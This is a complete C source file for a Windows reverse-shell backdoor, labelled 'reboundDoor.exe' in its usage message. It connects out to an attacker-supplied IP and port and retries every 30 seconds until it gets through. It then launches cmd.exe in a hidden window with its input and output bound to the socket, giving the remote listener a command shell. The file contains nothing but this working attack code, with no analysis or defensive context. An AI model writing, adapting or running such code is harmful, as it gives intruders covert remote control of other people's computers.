#pragma comment(lib, "ws2_32")
#pragma comment(lib, "advapi32")
#pragma comment(lib, "user32")
#include <winsock2.h>
#include <stdio.h>

//int main(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpszCmdLine, int nCmdShow){
int main(int argc, char *argv[]){
    WSADATA wsa;
    SOCKET sock;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    struct sockaddr_in sin;

    if(argc<3){
        puts("name: reboundDoor.exe\nfunc: reverse connection\nusage: this.exe 192.168.12.1 999");
        return 1;
    }

    memset(&si, 0 , sizeof(si));
    WSAStartup(MAKEWORD(2,2), &wsa);

    //PF_INET == AF_INET
    sock = WSASocket(PF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(atoi(argv[2]));
    sin.sin_addr.s_addr = inet_addr(argv[1]);

    while( connect(sock, (struct sockaddr*)&sin, sizeof(sin)) )
        Sleep(30000);

    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW + STARTF_USESTDHANDLES; //+?
    si.wShowWindow = SW_HIDE;
    si.hStdInput = si.hStdOutput = si.hStdError = (void*)sock;

    CreateProcess(NULL, "cmd.exe", NULL, NULL, 1, 0, NULL, NULL, &si, &pi);
    return 0;
    
}
